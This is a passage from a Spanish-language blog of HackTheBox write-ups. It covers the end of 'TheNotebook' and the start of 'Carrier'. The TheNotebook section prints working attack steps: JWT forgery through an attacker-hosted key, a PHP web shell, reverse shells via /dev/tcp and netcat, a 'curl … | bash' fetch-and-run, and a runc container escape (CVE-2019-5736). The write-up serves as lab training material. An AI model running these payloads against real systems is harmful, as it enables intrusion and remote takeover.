230/admin200 -  1KB - http://10. 10. 10. 230/login302 - 209B - http://10. 10. 10. 230/logout -&gt; http://10. 10. 10. 230/200 -  1KB - http://10. 10. 10. 230/registerPero tenemos un c√≥digo de estado 403 que nos indica la prohibici√≥n completa hacia ese recurso :P Pero jugando con ese mismo recurso encontramos otros directorios:  Status code 403 Forbidden. ‚ù≠ dirsearch. py -u http://10. 10. 10. 230/admin -w /opt/SecLists/Discovery/Web-Content/raft-small-directories. txt -q403 -  9B - http://10. 10. 10. 230/admin/upload200 -  3KB - http://10. 10. 10. 230/admin/notesCurioso, tenemos prohibido el acceso al recurso /a, pero no al /admin/notes`, veamos si podemos obtener algo de ah√≠: Jmm, intentando agregar notas siempre obtenemos ‚ÄúInternal Server Error‚Äù, peeero si nos fijamos en la URL, a veces cambia como si hiciera la inserci√≥n de la nota, veamos un ejemplo r√°pidamente:  En la URL se agrega un numero y si validamos si se cre√≥ la nota: Y si, se crea‚Ä¶ Pero no logre hacer nada con esto :P üóª Salimos del Rabbit hole: Dando vueltas y revisando cositas, nos damos cuenta de algo lindo en nuestra cookie: (podemos verla de varias formas, pero como lo divide el navegador esta bien para que se entienda mejor lo que haremos) Es un formato que hab√≠a usado en alguna ocasi√≥n y de una me acord√© de que trataba (tambi√©n por el inicio de la cadena (ey, que en base64 es {  (o sea el inicio de un JSON e. e))‚Ä¶ JSON Web Tokens, que sirven para transmitir informaci√≥n mediante objetos JSON de manera segura, esto gracias a que son firmados digitalmente con llaves privadas o p√∫blicas.  Qu√© es JSON Token y como funciona. Entonces, podemos usar la herramienta jwt. io para jugar con estos tokens, as√≠ que, tomamos nuestra cookie auth y la pegamos a la izquierda: Algo lindo de esta herramienta es que nos separa por colores (y puntos) las partes del token (cada parte del array que nos mostr√≥ el navegador). Cada apartado del token esta en base64, la p√°gina nos lo decodea y a la derecha tenemos el resultado‚Ä¶ (Todo esto podemos cambiarlo, pero antes veamos que hay en cada apartado) Header: Vemos el tipo de token y el tipo de algoritmo usado yyyyy podemos deducir que esta tomando la llave privada servida en el puerto 7070 del localhost llamada privKey. key. Payload (Data): Tenemos info del usuario y un campo extra√±o que hace alusi√≥n a algo sobre el administrador y en nuestro caso esta apagado‚Ä¶ Interesante. Verify signature: Ac√° va la llave privada del host. ‚Ä¶ Explotaci√≥n #: Bien, como podemos aprovecharnos de esto‚Ä¶ Sabemos que esta usando una URL para leer la llave privada que usa contra el JWT, entonces:  Generaremos una llave privada.  hostearemos un servidor web.  Y en el header pondremos nuestra URL llamando la llave, esto para que la web tome nuestra llave y podamos modificar el token. En el apartado payload (data) aprovecharemos el √≠tem que habla del admin para alterarlo a true y ver si nos asignan como administradores del sistema de notas. Y finalmente agregaremos nuestra llave privada en verify signature. D√©mosle. Generemos la llave privada, me guie de este recurso: Header: ‚ù≠ openssl genrsa 2048 &gt; palaKeypa. key# pero despues de generarla, copiarla y pegarla en la web# vemos que es m√°s peque√±a que la que ya estaba originalmetn en nusetro token,# asi que le modificamos el tama√±o al doble‚ù≠ openssl genrsa 4096 &gt; palaKeypa. keyGenerating RSA private key, 4096 bit long modulus (2 primes). . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . ++++. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . ++++e is 65537 (0x010001)‚ù≠ chmod 400 palaKeypa. keyEntonces, ahora modificamos el header: (se puede hacer en la Shell o en la web, para que sea m√°s legible se las mostrar√© en la web) { typ :  JWT , alg :  RS256 , kid :  http://10. 10. 14. 194:8000/palaKeypa. key }Lo pasamos a base64: ‚ù≠ echo '{ typ :  JWT , alg :  RS256 , kid :  http://10. 10. 14. 194:8000/palaKeypa. key }' | base64 eyJ0eXAiOiAiSldUIiwiYWxnIjogIlJTMjU2Iiwia2lkIjogImh0dHA6Ly8xMC4xMC4xNC4xOTQ6ODAwMC9wYWxhS2V5cGEua2V5In0KY pegamos en la web (pegado y sin =) Payload (data): { username :  lanz , email :  lanz@lanz. htb , admin_cap : true}‚ù≠ echo '{ username :  lanz , email :  lanz@lanz. htb , admin_cap : true}' | base64eyJ1c2VybmFtZSI6ICJsYW56IiwiZW1haWwiOiAibGFuekBsYW56Lmh0YiIsImFkbWluX2NhcCI6IHRydWV9Cg== Verify signature: Copiamos la llave que generamos (con todo y --) y la pegamos en la web en esta parte: Y listos, tenemos nuestro token generado. Ahora la prueba de fuego. Hosteamos el servidor web: ‚ù≠ python3 -m http. serverServing HTTP on 0. 0. 0. 0 port 8000 (http://0. 0. 0. 0:8000/) . . . Tomamos el token, editamos nuestra cookie auth por la nueva y simplemente refrescamos la p√°gina. Yyyyyyyyyy obtenemos: . . . Serving HTTP on 0. 0. 0. 0 port 8000 (http://0. 0. 0. 0:8000/) . . . 10. 10. 10. 230 - - [15/Mar/2021 25:25:25]  GET /palaKeypa. key HTTP/1. 1  200 - ¬øVes algo distinto? e. e (Tamos dentro como admin fathEEEEEEer, muy lindo esto) Veamos el nuevo apartado Admin Panel:  Opa, podemos subir archivos y parece que de cualquier tipo, probemos a subir de una un archivo . php para generar ejecuci√≥n remota de comandos. Veamos si nos da alg√∫n problema‚Ä¶ ‚ù≠ cat toRiCE. php &lt;?php $coma=shell_exec($_GET['xmd']); echo $coma; ?&gt;El script simplemente indica: que recibir√° una petici√≥n mediante el m√©todo GET y la guardara en la variable xmd, esta a su vez, har√° una petici√≥n al sistema mediante shell_exec y el resultado del comando ejecutado se guardar√° en la variable $coma, al final simplemente mostramos ese contenido. Sub√°moslo, seleccionamos el archivo y damos clic en Save, nos devuelve: Veamos el archivo que se subi√≥ y probemos de una vez por ejemplo, ver que usuario somos y el hostname: Perfecto, tenemos ejecuci√≥n remota de comandos, entabl√©monos una Reverse Shell‚Ä¶ (El archivo es borrado r√°pidamente as√≠ que debemos ser igual o m√°s r√°pidos) Probando y fallando podemos generar un archivo . sh que contenga lo que queramos ejecutar en el sistema y simplemente como comando en la web le decimos que haga un cURL hacia nuestro script y que a su vez interprete y ejecute el contenido: ‚ù≠ cat rev. sh #!/bin/bashbash -c  bash -i &gt;&amp; /dev/tcp/10. 10. 14. 194/4433 0&gt;&amp;1 #rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2&gt;&amp;1 | nc 10. 10. 14. 194 4433 &gt;/tmp/fColocamos este archivo en la ruta en que tenemos el servidor de Python activo, as√≠ evitamos servir otro puerto :P Nos ponemos en escucha con netcat: ‚ù≠ nc -lvp 4433listening on [any] 4433 . . . Y lanzamos como payload para validar que tenemos comunicaci√≥n y ve nuestro c√≥digo: http://10. 10. 10. 230/f34242c373ba88e18f73fd2e0eccd648. php?xmd=curl http://10. 10. 14. 194:8000/rev. shY simplemente le agregamos | bash para que interprete el contenido del archivo y lo ejecute en el sistema: http://10. 10. 10. 230/f34242c373ba88e18f73fd2e0eccd648. php?xmd=curl http://10. 10. 14. 194:8000/rev. sh | bashYYYYYYYyyyyYye. e: Tamos dentro de la m√°quina, peeeerfectowowowo. ‚Ä¶ Es un poco MEHH el estar creando el token, modificando la cookie y todo eso manualmente, as√≠ que aprovechemos la oportunidad para automatizar toooodo y obtener ejecuci√≥n de comandos simplemente pas√°ndole el comando que queremos ejecutar a un script:  RCE_phpfile. py. Ahora s√≠, sigamos. ‚Ä¶ Movimiento lateral www-data -&gt; noah #: Enumerando el directorio /var/backups encontramos un archivo algo llamativo: www-data@thenotebook:/var/backups$ ls -latotal 60drwxr-xr-x 2 root root 4096 Mar 22 08:20 . drwxr-xr-x 14 root root 4096 Feb 12 06:52 . . -rw-r--r-- 1 root root 33252 Feb 24 08:53 apt. extended_states. 0-rw-r--r-- 1 root root 3609 Feb 23 08:58 apt. extended_states. 1. gz-rw-r--r-- 1 root root 3621 Feb 12 06:52 apt. extended_states. 2. gz-rw-r--r-- 1 root root 4373 Feb 17 09:02 home. tar. gzCopiemos el archivo comprimido e intentemos ver su contenido: www-data@thenotebook:/var/backups$ cp home. tar. gz /dev/shm/www-data@thenotebook:/var/backups$ cd !$cd /dev/shm/www-data@thenotebook:/dev/shm$ lshome. tar. gzwww-data@thenotebook:/dev/shm$ gzip -d home. tar. gz www-data@thenotebook:/dev/shm$ lshome. tarwww-data@thenotebook:/dev/shm$ tar xvf home. tar home/home/noah/home/noah/. bash_logouthome/noah/. cache/home/noah/. cache/motd. legal-displayedhome/noah/. gnupg/home/noah/. gnupg/private-keys-v1. d/home/noah/. bashrchome/noah/. profilehome/noah/. ssh/home/noah/. ssh/id_rsahome/noah/. ssh/authorized_keyshome/noah/. ssh/id_rsa. pubOpa, el backup del /home de un usuario llamado noah (efectivamente en la m√°quina existe), tenemos un par de llaves SSH, copi√©monos el contenido de la llave privada (id_rsa) y cre√©monos un archivo con su contenido en nuestra m√°quina, esto para entrar por medio de SSH sin tener que ingresar contrase√±a:  Info SSH keys (Espa√±ol). ‚ù≠ cat key_noah -----BEGIN RSA PRIVATE KEY-----MIIEpQIBAAKCAQEAyqucvz6P/EEQbdf8cA44GkEjCc3QnAyssED3qq9Pz1LxEN04HbhhDfFxK+EDWK4ykk0g5MvBQckcxAs31mNnu+UClYLMb4YXGvriwCrtrHo/ulwTrLymqVzxjEbLUkIgjZNW49ABwi2pDfzoXnij9JK8s3ijIo+w/0RqHzAfgS3Y7t+b. . . ‚ù≠ chmod 400 key_noahY ejecutamos hacia la m√°quina: ‚ù≠ ssh noah@10. 10. 10. 230 -i key_noah load pubkey  key_noah : invalid formatWelcome to Ubuntu 18. 04. 5 LTS (GNU/Linux 4. 15. 0-135-generic x86_64). . . Nice, somos noah y tenemos acceso a la flag user. txt. ‚Ä¶ Escalada de privilegios #: Si vemos los permisos que tenemos como root, encontramos: noah@thenotebook:/dev/shm$ sudo -lMatching Defaults entries for noah on thenotebook:  env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/binUser noah may run the following commands on thenotebook:  (ALL) NOPASSWD: /usr/bin/docker exec -it webapp-dev01*El usuario noah puede ejecutar comandos inicialmente en el contenedor webapp-dev01 y dado el caso en todos los contenedores que empiecen con webapp-dev01, veamos que hay dentro, ejecutemos una bash en el container: noah@thenotebook:/dev/shm$ sudo /usr/bin/docker exec -it webapp-dev01 bashroot@c8d1914f59cd:/opt/webapp# ls -latotal 52drwxr-xr-x 1 root root 4096 Feb 12 07:30 . drwxr-xr-x 1 root root 4096 Feb 12 07:30 . . drwxr-xr-x 1 root root 4096 Feb 12 07:30 __pycache__drwxr-xr-x 3 root root 4096 Nov 18 13:27 admin-rw-r--r-- 1 root root 3303 Nov 16 19:43 create_db. py-rw-r--r-- 1 root root 9517 Feb 11 15:00 main. py-rw------- 1 root root 3247 Feb 11 15:09 privKey. key-rw-r--r-- 1 root root  78 Feb 12 07:12 requirements. txtdrwxr-xr-x 3 root root 4096 Nov 19 10:57 staticdrwxr-xr-x 2 root root 4096 Nov 18 13:47 templates-rw-r--r-- 1 root root  20 Nov 20 09:18 webapp. tar. gzBien, tenemos la estructura y todos los archivos que usa para el servidor web de las notas‚Ä¶ Pero enumerando no encontramos nada relevante, as√≠ que regresemos y volvamos a enumerar‚Ä¶ Si vemos la versi√≥n actual de Docker obtenemos la 18. 06. 0-ce: noah@thenotebook:~$ docker -vDocker version 18. 06. 0-ce, build 0ffa825Buscando vulnerabilidades sobre ella, encontramos el CVE CVE-2019-5736:  Docker 18. 06. 0-ce Vulnerabilities. Nos indica que el binario runc (que se ejecuta cuando ¬´ejecutamos¬ª Docker) es vulnerable a ser sobreescrito y por consiguiente indicarle comandos para que sean ejecutados como el usuario root en la m√°quina host :O  runC: ‚Äúcommand-line tool for spawning and running containers‚Äù. Nice, busquemos referencias de exploits a ver cu√°l podemos usar: Tenemos varios, d√°ndole unos ojazos, el m√°s sencillo de entender es el de Frichetten, esta hecho en . go y solo debemos mover un archivo al sistema, met√°mosle candela:  https://github. com/Frichetten/CVE-2019-5736-PoC. Lo clonamos en nuestra m√°quina y vemos el archivo main. go, explor√°ndolo simplemente debemos modificar la variable payload, como prueba har√© que nos env√≠e el resultado del comando hostname a nuestro listener en nc: . . . // This is the line of shell commands that will execute on the hostvar payload =  #!/bin/bash \n hostname | nc 10. 10. 14. 194 4433 . . . Bajando un poco (y leyendo el repo) nos indica lo que har√°. Tomar√° el binario /bin/sh y lo sobreescribir√° para que una vez sea ejecutado Docker este llame el binario runC y este a su vez sobreescriba el contenido del binario /bin/sh para que se transforme en el contenido de nuestra variable payload (o sea el comando hostname en este caso). Pero veremos la ejecuci√≥n del payload una vez hagamos el llamado del binario /bin/sh (que en esta parte ya estar√≠a modificado) en el contenedor (para esto necesitaremos otra Shell con el usuario noah, para primero ejecutar el binario main y por segundo ejecutar la explotaci√≥n (el binario /bin/sh)). Listo, guardamos y creamos el binario: ‚ù≠ go build main. go #Genera el binario  main ‚ù≠ lsmain main. go README. md screenshotsListos, ahora podemos subirlo al contenedor, creemos un servidor en Python y de paso pong√°monos en escucha con nc: ‚ù≠ python3 -m http. serverServing HTTP on 0. 0. 0. 0 port 8000 (http://0. 0. 0. 0:8000/) . . . ‚ù≠ nc -lvp 4433listening on [any] 4433 . . . En la m√°quina v√≠ctima indicamos: noah@thenotebook:~$ sudo /usr/bin/docker exec -it webapp-dev01 bashroot@c6d778ee6b03:/opt/webapp# cd /dev/shm# Descargamos el binario a la m√°quinaroot@c6d778ee6b03:/dev/shm# wget http://10. 10. 14. 194:8000/main. . . root@c6d778ee6b03:/dev/shm# ls -latotal 2220drwxrwxrwt 2 root root   60 Mar 16 19:58 . drwxr-xr-x 5 root root   360 Mar 16 19:16 . . -rw-r--r-- 1 root root 2269904 Mar 16 19:42 main# Damos permisos de ejecuci√≥nroot@c6d778ee6b03:/dev/shm# chmod +x mainroot@c6d778ee6b03:/dev/shm# ls -latotal 2220drwxrwxrwt 2 root root   60 Mar 16 19:58 . drwxr-xr-x 5 root root   360 Mar 16 19:16 . . -rwxr-xr-x 1 root root 2269904 Mar 16 19:42 mainAc√° estuve perdido un rato, ya que no lograba ejecutarlo: root@c6d778ee6b03:/dev/shm# . /mainbash: . /main: Permission deniedroot@c6d778ee6b03:/dev/shm# bash main main: main: cannot execute binary file. . . D√°ndole vueltas, desist√≠ de ese script y us√© otros repositorios, pero no consegu√≠a ejecutar NADA (¬øya puedes imaginar por qu√©?)‚Ä¶ Pues resulta que si hacemos el mismo procedimiento, pero en el directorio /tmp o incluso en el directorio /opt/webapp, ah√≠ si me permite ejecutarlo üôÉ Claramente por permisos que no entiendo, pero pues X: root@c6d778ee6b03:/dev/shm# mv main /tmp/root@c6d778ee6b03:/dev/shm# cd /tmp/root@c6d778ee6b03:/tmp# ls -latotal 2264drwxrwxrwt 1 root root  4096 Mar 16 20:05 . drwxr-xr-x 1 root root  4096 Mar 16 19:16 . . -rwxr-xr-x 1 root root 2269904 Mar 16 19:42 main-rw-r--r-- 1 root root   78 Feb 12 07:12 requirements. txt-rw-r--r-- 1 root root  32768 Feb 12 07:30 webapp. dbEjecutamos: root@c6d778ee6b03:/tmp# . /main [+] Overwritten /bin/sh successfullyY se queda a la espera de la ejecuci√≥n del binario /bin/sh, as√≠ que abrimos la otra sesi√≥n con SSH y volvemos a ejecutar el archivo main, pero ahora en la nueva Shell indicamos: noah@thenotebook:~$ sudo /usr/bin/docker exec -it webapp-dev01 /bin/shY en la sesi√≥n donde esta corriendo el binario main obtenemos: root@867e71dd120c:/tmp# . /main [+] Overwritten /bin/sh successfully[+] Found the PID: 66[+] Successfully got the file handle[+] Successfully got write handle &amp;{0xc0000aa8a0}root@867e71dd120c:/tmp# Yyyy en nuestro listener: ‚ù≠ nc -lvp 4433listening on [any] 4433 . . . 10. 10. 10. 230: inverse host lookup failed: Host name lookup failureconnect to [10. 10. 14. 194] from (UNKNOWN) [10. 10. 10. 230] 51878thenotebookPerfectoooo, estamos hablando con el host, entabl√©monos una Reverse Shell: . . . var payload =  #!/bin/bash \n bash -c 'bash -i &gt;&amp; /dev/tcp/10. 10. 14. 194/4433 0&gt;&amp;1 &amp;' . . .  Compilamos.  Subimos binario main al contenedor.  Abrimos otra sesi√≥n SSH.  Ejecutamos el binario main.  Ejecutamos el binario /bin/sh en la nueva sesi√≥n.  Obtenemos nuestra Reverse Sheeeeeeeeeeeeeeell. Perfectooooooooooooooooooooooooooo, hacemos tratamiento de la TTY y procedemos a ver las flags:  Savitar te explica el tratamiento de la TTY. ‚Ä¶ Linda m√°quina, me fascino el inicio, por lo tanto me cree un script para que haga toooodo el proceso de cambiar la cookie, subir el archivo yyy ejecutar los comandos (:  RCE mediante el archivo . phpMuy loco el tema de Docker y runc, y casi muero intentando ejecutar el binario en esa ruta :( Perooo bueno, se solucion√≥. Muchas gracias por pasarse y leerse este mont√≥n de texto :P Y nada, a seguir rompiendo todo (: "
    }, {
    "id": 31,
    "url": "http://localhost:4000/htb/carrier",
    "title": "HackTheBox - Carrier",
    "body": "2021/07/29 - M√°quina Linux nivel medio. Enumeraremos bastante y leeremos m√°s. Jugaremos con SNMP, inyecci√≥n de comandos de un proceso en la web yyyyyy una locura llamada BGP Hijacking. Interceptaremos el tr√°fico de un servidor FTP para obtener credenciales de acceso.  TL;DR (Spanish writeup): Creada por: snowscan. ¬°Que lindura como vamos a escalar esta cosaaaaaaaaaaaaaaaaa!! Nos encontraremos con un servidor web con varios recursos fuera de nuestra vista, recolectaremos varias cositas para nuestro privesc. En la web tendremos un login, pero vamos a estar ciegos probando cosas. Enumerando los puertos UDP encontraremos un servicio SNMP activo, jugando con snmpwalk veremos que devuelve una l√≠nea algo extra√±a al ver sus recursos. Si concatenamos lo encontrado antes, nuestro research y esta cadena, conseguiremos iniciar sesi√≥n en la web como el usuario admin. Estando dentro encontraremos una parte que devuelve el resultado de -listar procesos internos- en la web, para saber que proceso listar usa una variable que es enviada en base64 y por el m√©todo POST. Si nos ponemos traviesos con esa variable lograremos inyectar comandos en el sistema, nos aprovecharemos de esto para generar una reverse Shell como el usuario que sostiene la web, en este caso root. Pues ya estar√≠a ¬øno? pos no :) Enumerando el sistema nos daremos cuenta de que estamos dentro de un router :O (ac√° empezamos a concatenar lo encontrado al inicio), tendremos acceso a su configuraci√≥n por medio de una CLI de la herramienta Quagga. Jugando y jugando veremos que necesitamos realizar un ataque llamado BGP Hijacking, tomando de nuevo lo encontrado al inicio sabremos que existen 3 routers, nosotros y dos m√°s, hay un host entre tooodos los routers (obtenemos el segmento tambi√©n de nuestra enum inicial) que esta conect√°ndose a un servidor FTP, la idea con nuestro ataque es decirle a los dos routers (que est√°n envi√°ndose la data del server FTP) que nos posicionen como ‚Äúla mejor ruta‚Äù para enviar la data de un lado a otro. Y de que nos sirve esto‚Ä¶. Sencillamente para interceptar toooodo el tr√°fico (en este caso) FTP que se est√©n enviando. Mediante este ataque (mmoooooooooooy lindo) vamos a conseguir ver las credenciales de acceso del usuario root al servidor FTP, haciendo reutilizaci√≥n de contrase√±as lograremos una Shell por medio de SSH como el usuario root, ahora si en la m√°quina Carrier. ‚Ä¶ Clasificaci√≥n de la m√°quina seg√∫n la gentesita: Bastante real y 0 juegos, vamos a hablar con las manitos.  Escribo para tener mis ‚Äúnotas‚Äù, por si algun dia se me olvida todo, leer esto y reencontrarme (o talvez no) :) adem√°s de enfocarme en plasmar mis errores y exitos (por si ves mucho texto), todo desde una perspectiva m√°s de ense√±anza que de solo mostrar lo que hice. ‚Ä¶ Es que a veces no vemos porque no queremos.  Enumeraci√≥n.      Enumeraci√≥n de puertos con nmap.    Enumeramos servidor web en el puerto 80, varios recursos, principalmente un Login Panel.    Logramos pasar el login encontrando credenciales por SNMP.     Explotaci√≥n, inyectamos comandos en un apartado del servidor web.  Escalada de privilegios, jugueteo con el protocolo BPG, intentando BGP Hijacking.      Hablamos un poco sobre el protocolo BGP y sus caracter√≠sticas.    Exploramos CLI de Quagga para comunicarnos con los sistemas aut√≥nomos de BGP.    Logramos BGP Hijacking peeero con un fallito.    Ahora si logramos BGP Hijacking y encontramos credenciales en tr√°fico FTP.    ‚Ä¶ Enumeraci√≥n #: Enumeraci√≥n de puertos con nmap üîó: Vamos a empezar como siempre por nuestro escaneo de puertos: ‚ù± nmap -p- --open -v 10. 10. 10. 105 -oG initScan      Par√°metro   Descripci√≥n         -p-   Escanea todos los 65535       ‚Äìopen   Solo los puertos que est√°n abiertos       -v   Permite ver en consola lo que va encontrando       -oG   Guarda el output en un archivo con formato grepeable para usar una funci√≥n extractPorts de S4vitar que me extrae los puertos en la clipboard   Obtenemos: ‚ù± cat initScan# Nmap 7. 80 scan initiated Tue Jul 27 25:25:25 2021 as: nmap -p- --open -v -oG initScan 10. 10. 10. 105# Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)Host: 10. 10. 10. 105 () Status: UpHost: 10. 10. 10. 105 () Ports: 22/open/tcp//ssh///, 80/open/tcp//http///# Nmap done at Tue Jul 27 25:25:25 2021 -- 1 IP address (1 host up) scanned in 237. 32 seconds      Puerto   Descripci√≥n         22   SSH: Para obtener Shells seguras.        80   HTTP: Un servidor web.    Ahora con los puertos podemos realizar un segundo escaneo, pero para encontrar que versiones y scripts est√°n siendo usados por cada servicio: ~(Usando la funci√≥n extractPorts (referenciada antes) podemos copiar r√°pidamente los puertos en la clipboard, as√≠ no tenemos que ir uno a uno, en este caso no es relevante, ya que solo tenemos 2 puertos, pero pues cuando tengamos muchos esta herramienta es brutal ‚ù± extractPorts initScan [*] Extracting information. . .   [*] IP Address: 10. 10. 10. 105  [*] Open ports: 22,80[*] Ports copied to clipboard)~ ‚ù± nmap -p 22,80 -sC -sV 10. 10. 10. 105 -oN portScan      Par√°metro   Descripci√≥n         -p   Escaneo de los puertos obtenidos       -sC   Muestra todos los scripts relacionados con el servicio       -sV   Nos permite ver la versi√≥n del servicio       -oN   Guarda el output en un archivo   Con este escaneo recibimos: ‚ù± cat portScan# Nmap 7. 80 scan initiated Tue Jul 27 25:25:25 2021 as: nmap -p 22,80 -sC -sV -oN portScan 10. 10. 10. 105Nmap scan report for 10. 10. 10. 105Host is up (0. 11s latency). PORT  STATE SERVICE VERSION22/tcp open ssh   OpenSSH 7. 6p1 Ubuntu 4 (Ubuntu Linux; protocol 2. 0)| ssh-hostkey: |  2048 15:a4:28:77:ee:13:07:06:34:09:86:fd:6f:cc:4c:e2 (RSA)|  256 37:be:de:07:0f:10:bb:2b:b5:85:f7:9d:92:5e:83:25 (ECDSA)|_ 256 89:5a:ee:1c:22:02:d2:13:40:f2:45:2e:70:45:b0:c4 (ED25519)80/tcp open http  Apache httpd 2. 4. 18 ((Ubuntu))| http-cookie-flags: |  /: |   PHPSESSID: |_   httponly flag not set|_http-server-header: Apache/2. 4. 18 (Ubuntu)|_http-title: LoginService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap. org/submit/ . # Nmap done at Tue Jul 27 25:25:25 2021 -- 1 IP address (1 host up) scanned in 22. 76 secondsPodemos destacar:       Puerto   Servicio   Versi√≥n         22   SSH   OpenSSH 7. 6p1       80   HTTP   Apache httpd 2. 4. 18   No vemos nada m√°s, as√≠ que empecemos a darle y descubramos por donde romper la m√°quina. ‚Ä¶ Puerto 80 üîó: Nos encontramos con un login panel, unos errores y un nombre al parecer de un servicio, Lyghtspeed. Buscando info en la web sobre √©l no concluimos nada, as√≠ que sigamos enumerando. Usando paylaods y credenciales conocidas en el login no logramos acceder, hagamos un fuzzeo de directorios a ver si existen objetos fuera a nuestra vista: ‚ù± dirsearch. py -w /opt/SecLists/Discovery/Web-Content/common. txt -u http://10. 10. 10. 105/. . . Target: http://10. 10. 10. 105/[25:25:25] Starting: [25:25:25] 301 - 310B - /css -&gt; http://10. 10. 10. 105/css/[25:25:25] 301 - 312B - /debug -&gt; http://10. 10. 10. 105/debug/[25:25:25] 301 - 310B - /doc -&gt; http://10. 10. 10. 105/doc/[25:25:25] 301 - 312B - /fonts -&gt; http://10. 10. 10. 105/fonts/[25:25:25] 301 - 310B - /img -&gt; http://10. 10. 10. 105/img/[25:25:25] 200 -  1KB - /index. php[25:25:25] 301 - 309B - /js -&gt; http://10. 10. 10. 105/js/[25:25:25] 403 - 300B - /server-status[25:25:25] 301 - 312B - /tools -&gt; http://10. 10. 10. 105/tools/. . . Dos interesantes, si profundizamos un toque m√°s, vemos otro recurso: ‚ù± dirsearch. py -w /opt/SecLists/Discovery/Web-Content/raft-medium-directories. txt -u http://10. 10. 10. 105/. . . [12:55:51] 301 - 312B - /debug -&gt; http://10. 10. 10. 105/debug/. . . As√≠ que tenemos inicialmente 3 recursos fuera de nuestra vista:  /doc /debug.  /tools. Empecemos a ver si hay algo en ellos: ~ http://10. 10. 10. 105/doc/: Dos archivos, bien, veamos otro recurso. ~ http://10. 10. 10. 105/debug/: El resultado de ejecutar phpinfo(), ¬øse ve la flecha? Hay varias cositas para leer en este recurso, sigamos con el otro. ~ http://10. 10. 10. 105/tools/: Otro archivo. Ahora que encontramos todos los recursos veamos si nos son de utilidad para jugar con el login‚Ä¶ ‚Ä¶ ~ http://10. 10. 10. 105/doc/:üõéÔ∏è error_codes. pdf Bien, este documento parece super interesante e importante para seguir, nos muestra varios errores (donde vemos dos con el c√≥digo que vimos en el login, as√≠ que podemos tomar su definici√≥n y relacionarla), pero lo llamativo es el servicio del cual son originarios, CW1000-X Lyghtspeed Management Platform v1. 0. 4, el nombre es muy largo y si lo buscamos en internet lo que nos podemos encontrar son puros spoilers jajaj, as√≠ que rompamos la cadena. Sabemos que es una plataforma de gesti√≥n en su versi√≥n 1. 0. 4, Lyghtspeed ya lo hab√≠amos buscado as√≠ que no nos interesa y nos quedar√≠a CW1000-X, que si buscamos en la web, encontramos que es un Access Controller (AC):  ‚ÄúEs una tecnolog√≠a que permite controlar de forma muy granular qu√© dispositivos pueden acceder a la red, permitiendo establecer pol√≠ticas de gesti√≥n en los dispositivos‚Äù esto seg√∫n secure. it. Pues muy rico, todo lo que encontramos habla de Access Controller. Encontramos otro recurso que muestra una gu√≠a de usuario para un controlador de acceso, es muy interesante, √©chenle un ojito. Algo que encontramos en √©l (y en b√∫squedas) son unas credenciales que vienen detr√°s del dispositivo:  admin:admin (son las credenciales que siempre intento primero en cualquier login üòù)Probando no logramos pasar el inicio de sesi√≥n, as√≠ que F. Nos quedaremos con lo encontrado y seguiremos (tiene sentido lo del AC por los errores y por lo que vamos a ver a continuaci√≥n). üõéÔ∏è diagram_for_tac. png Un diagrama de routers, al inicio estaba s√∫per ‚ÄúWTF que es estoooooooooooooooooooooooooo y que hagooooooooo‚Äù, pero con una simple b√∫squeda como Lyghtspeed Networks (que esta en la imagen, no me lo invente) vemos las relaciones y algunos spoilers que querr√°n traicionar nuestra mente, pero NOOO! nada de eso, vamos a investigar.  ‚ÄúLos routers gu√≠an y dirigen los datos de red mediante paquetes que contienen varios tipos de datos, como archivos, comunicaciones y transmisiones simples como interacciones web‚Äù, dicelo cisco. En el primer link vemos un recurso llamado BGP Hijacking Attack, Border Gateway Protocol, Network Routing, Internet Infrastructure, (que si profundizamos MMMMMMUUUUUCHO sabemos que tiene spoilers, as√≠ que hacemos scroll hacia el inicio del archivo y vamos bajando muy despacio) al inicio esta lo que nos interesa üò¨  ‚ÄúBGP is the routing protocol that runs the Internet. It manages how packets get routed from network to network by exchanging routing and reachability information. ‚Äù, nvidia. ‚Ä¶ ‚ùó‚ùó‚ùó PEEEEEEEEEEEEERO despu√©s de leer cositas de estas y relacionar lo √∫nico que tenemos (el Login) me di cuenta de que esta explicaci√≥n no tiene mucho sentido a√∫n, as√≠ que sigamos con los dem√°s recursos y cuando llegue el momento (va a llegar seguro, por la imagen que vimos del diagrama y lo que se lee y ve en el art√≠culo) volveremos a este loco tema‚Ä¶ ‚Ä¶ üõéÔ∏è Si revisamos el recurso /tools/remote. php nos devuelve:  License expired, exiting‚Ä¶ Y poco m√°s podemos hacer con √©l‚Ä¶ Finalmente viendo el contenido de /debug (donde ve√≠amos el resultado de la funci√≥n phpinfo()) adem√°s de algunas versiones, no hay nada relevante. As√≠ que tamos F :( ‚Ä¶ Logramos pasar el login encontrando creds por SNMP üîó: Despu√©s de leer lo del Access Controller se me dio por enumerar puertos UDP con nmap (usamos el par√°metro -sU), quiz√°s hab√≠a algo de redes por ah√≠ activo y s√≠, hay algo: ‚ù± nmap -sU -p- --open --min-rate=2000 -oG udpScanEl escaneo va super lento, por eso le agregamos el par√°metro --min-rate=N, para indicarle que no env√≠e menos de N paquetes en cada petici√≥n, as√≠ va muuucho m√°s r√°pido, el escaneo nos responde: # Nmap 7. 80 scan initiated Tue Jul 27 25:25:25 2021 as: nmap -sU -p- --open -v --min-rate=2000 -oG udpScan 10. 10. 10. 105# Ports scanned: TCP(0;) UDP(65535;1-65535) SCTP(0;) PROTOCOLS(0;)Host: 10. 10. 10. 105 () Status: UpHost: 10. 10. 10. 105 () Ports: 161/open/udp//snmp///# Nmap done at Tue Jul 27 25:25:25 2021 -- 1 IP address (1 host up) scanned in 368. 28 secondsPuerto 161/udp abierto, que con nuestro segundo escaneo confirmamos el servicio SNMP (digo confirmamos porque ya lo sab√≠a al ver el puerto, pero quiz√°s uds no e. e): # Nmap 7. 80 scan initiated Tue Jul 27 25:25:25 2021 as: nmap -sU -p 161 -sC -sV -oN udpPortScan 10. 10. 10. 105Nmap scan report for 10. 10. 10. 105Host is up (0. 11s latency). PORT  STATE SERVICE VERSION161/udp open snmp  SNMPv1 server; pysnmp SNMPv3 server (public)| snmp-info: |  enterprise: pysnmp|  engineIDFormat: octets|  engineIDData: 